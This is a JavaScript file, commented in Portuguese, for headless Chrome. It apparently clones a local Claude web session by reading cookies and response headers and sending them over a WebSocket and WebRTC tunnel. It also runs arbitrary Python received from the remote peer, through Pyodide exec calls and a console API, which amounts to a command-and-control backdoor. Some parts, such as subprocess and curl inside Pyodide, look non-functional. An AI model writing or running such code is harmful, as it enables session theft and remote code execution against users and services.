/**
 * Script Pyodide para Tunnel WebRTC
 * Arquivo: pyodide_tunnel_script.js
 * Este script é executado dentro do Chrome Headless
 */

// Configurações
const WSS_URL = 'wss://localhost:8765';
const TUNNEL_ID = 'tunnel_' + Math.random().toString(36).substring(2, 15);
let websocket = null;
let peerConnection = null;
let dataChannel = null;
let pyodide = null;

// Função principal de inicialização
async function initTunnel() {
    console.log('Inicializando tunnel SRI...');
    
    // Conectar ao servidor WSS
    await connectWebSocket();
    
    // Configurar WebRTC
    await setupWebRTC();
    
    // Inicializar Pyodide se disponível
    if (window.pyodide) {
        pyodide = window.pyodide;
        await setupPythonRuntime();
    }
    
    // Clonar sessão do Claude
    await cloneClaudeSession();
}

// Conexão WebSocket
async function connectWebSocket() {
    return new Promise((resolve, reject) => {
        websocket = new WebSocket(WSS_URL);
        
        websocket.onopen = () => {
            console.log('Conectado ao servidor WSS');
            
            // Registrar tunnel
            websocket.send(JSON.stringify({
                type: 'register_tunnel',
                tunnel_id: TUNNEL_ID,
                timestamp: Date.now()
            }));
            
            resolve();
        };
        
        websocket.onmessage = (event) => {
            const data = JSON.parse(event.data);
            handleWebSocketMessage(data);
        };
        
        websocket.onerror = (error) => {
            console.error('Erro WebSocket:', error);
            reject(error);
        };
        
        websocket.onclose = () => {
            console.log('WebSocket fechado, reconectando em 5s...');
            setTimeout(connectWebSocket, 5000);
        };
    });
}

// Configuração WebRTC
async function setupWebRTC() {
    const configuration = {
        iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' },
            { urls: 'stun:stun2.l.google.com:19302' },
            { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' }
        ],
        iceCandidatePoolSize: 10,
        bundlePolicy: 'max-bundle',
        rtcpMuxPolicy: 'require',
        sdpSemantics: 'unified-plan'
    };
    
    peerConnection = new RTCPeerConnection(configuration);
    
    // Criar DataChannel
    dataChannel = peerConnection.createDataChannel('tunnelData', {
        ordered: true,
        maxRetransmits: 3,
        protocol: 'webrtc-tunnel'
    });
    
    dataChannel.onopen = () => {
        console.log('DataChannel WebRTC aberto');
        sendTunnelData('webrtc_ready', { tunnel_id: TUNNEL_ID });
    };
    
    dataChannel.onmessage = (event) => {
        console.log('Dados recebidos via WebRTC:', event.data);
        processIncomingData(event.data);
    };
    
    // Criar e enviar oferta
    const offer = await peerConnection.createOffer({
        offerToReceiveAudio: false,
        offerToReceiveVideo: false
    });
    
    await peerConnection.setLocalDescription(offer);
    
    // Aguardar candidatos ICE
    await new Promise((resolve) => {
        if (peerConnection.iceGatheringState === 'complete') {
            resolve();
        } else {
            peerConnection.onicegatheringstatechange = () => {
                if (peerConnection.iceGatheringState === 'complete') {
                    resolve();
                }
            };
        }
    });
    
    // Enviar oferta via WebSocket
    websocket.send(JSON.stringify({
        type: 'webrtc_offer',
        tunnel_id: TUNNEL_ID,
        sdp: peerConnection.localDescription
    }));
}

// Configuração Python com Pyodide
async function setupPythonRuntime() {
    // Instalar pacotes Python necessários
    await pyodide.loadPackage(['micropip', 'websockets', 'aiohttp']);
    
    // Executar código Python para tunnel
    const pythonCode = `
import asyncio
import json
import base64
import os
import sys
from datetime import datetime

class TunnelCore:
    def __init__(self, tunnel_id):
        self.tunnel_id = tunnel_id
        self.session_data = {}
        self.running = True
        
    async def process_data(self, data):
        """Processa dados recebidos"""
        try:
            # Decodificar se necessário
            if isinstance(data, str) and data.startswith('base64:'):
                data = base64.b64decode(data[7:]).decode('utf-8')
            
            # Processar comando
            if 'command' in data:
                await self.execute_command(data['command'], data.get('params', {}))
            
            return {'status': 'processed', 'tunnel': self.tunnel_id}
        except Exception as e:
            return {'status': 'error', 'error': str(e)}
    
    async def execute_command(self, command, params):
        """Executa comandos no Python"""
        if command == 'clone_session':
            # Clonar sessão
            self.session_data['last_clone'] = datetime.now().isoformat()
            return {'session_cloned': True}
        
        elif command == 'access_claude':
            # Acessar Claude via localhost
            import subprocess
            result = subprocess.run(
                ['curl', '-s', 'http://localhost:3000/api/graphql'],
                capture_output=True,
                text=True
            )
            return {'claude_response': result.stdout}
        
        elif command == 'run_python':
            # Executar código Python arbitrário
            code = params.get('code', '')
            exec_globals = {'__builtins__': __builtins__}
            exec(code, exec_globals)
            return {'executed': True}
    
    async def run(self):
        """Loop principal"""
        while self.running:
            await asyncio.sleep(0.1)

# Instanciar core
core = TunnelCore('${TUNNEL_ID}')
    `;
    
    await pyodide.runPythonAsync(pythonCode);
    console.log('Python runtime configurado com Pyodide');
}

// Clonar sessão do Claude
async function cloneClaudeSession() {
    try {
        // Acessar Claude via localhost (ajuste a porta conforme necessário)
        const claudeUrl = 'http://localhost:3000';
        
        // Fetch para obter dados da sessão
        const response = await fetch(claudeUrl, {
            credentials: 'include',
            headers: {
                'Accept': 'application/json',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            }
        });
        
        // Extrair cookies e headers de sessão
        const cookies = document.cookie;
        const sessionData = {
            url: response.url,
            status: response.status,
            headers: {},
            cookies: cookies
        };
        
        // Capturar headers
        response.headers.forEach((value, key) => {
            sessionData.headers[key] = value;
        });
        
        // Enviar sessão clonada via WebSocket
        websocket.send(JSON.stringify({
            type: 'session_clone',
            tunnel_id: TUNNEL_ID,
            session_id: 'claude_' + Date.now(),
            session: sessionData
        }));
        
        console.log('Sessão do Claude clonada:', sessionData);
        
    } catch (error) {
        console.error('Erro ao clonar sessão:', error);
        
        // Fallback: tentar via Pyodide
        if (pyodide) {
            await pyodide.runPythonAsync(`
import js
import json
from pyodide.http import pyfetch

async def clone_session():
    try:
        response = await pyfetch('http://localhost:3000')
        if response.ok:
            text = await response.text()
            print(f"Sessão clonada via Pyodide: {len(text)} bytes")
            return {'success': True, 'size': len(text)}
    except Exception as e:
        print(f"Erro: {e}")
        return {'success': False}

clone_session()
            `);
        }
    }
}

// Manipulação de mensagens WebSocket
function handleWebSocketMessage(data) {
    switch (data.type) {
        case 'webrtc_answer':
            if (peerConnection && data.sdp) {
                peerConnection.setRemoteDescription(new RTCSessionDescription(data.sdp));
            }
            break;
            
        case 'ice_candidate':
            if (peerConnection && data.candidate) {
                peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
            }
            break;
            
        case 'execute_python':
            if (pyodide) {
                pyodide.runPythonAsync(data.code);
            }
            break;
            
        default:
            console.log('Mensagem não tratada:', data);
    }
}

// Enviar dados via tunnel
function sendTunnelData(type, payload) {
    const message = {
        type: type,
        tunnel_id: TUNNEL_ID,
        payload: payload,
        timestamp: Date.now()
    };
    
    if (dataChannel && dataChannel.readyState === 'open') {
        dataChannel.send(JSON.stringify(message));
    } else if (websocket && websocket.readyState === WebSocket.OPEN) {
        websocket.send(JSON.stringify(message));
    }
}

// Processar dados recebidos
async function processIncomingData(data) {
    try {
        const parsed = JSON.parse(data);
        
        // Verificar se é Base64
        if (parsed.encoding === 'base64' && parsed.content) {
            const decoded = atob(parsed.content);
            console.log('Decodificado Base64:', decoded.substring(0, 100) + '...');
            
            // Se for Python, executar no Pyodide
            if (parsed.type === 'python' && pyodide) {
                await pyodide.runPythonAsync(decoded);
            }
        }
        
        // Encaminhar para Python se necessário
        if (pyodide && parsed.forward_to_python) {
            await pyodide.runPythonAsync(`
import json
data = json.loads('${JSON.stringify(parsed)}')
# Processar no Python
print(f"Processando no Python: {data}")
            `);
        }
        
    } catch (error) {
        console.error('Erro processando dados:', error);
    }
}

// Manter conexão ativa
setInterval(() => {
    sendTunnelData('ping', { time: Date.now() });
}, 30000);

// Iniciar quando a página carregar
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initTunnel);
} else {
    initTunnel();
}

// Exportar funções para console
window.tunnelAPI = {
    sendData: sendTunnelData,
    getTunnelId: () => TUNNEL_ID,
    runPython: (code) => pyodide?.runPythonAsync(code)
};
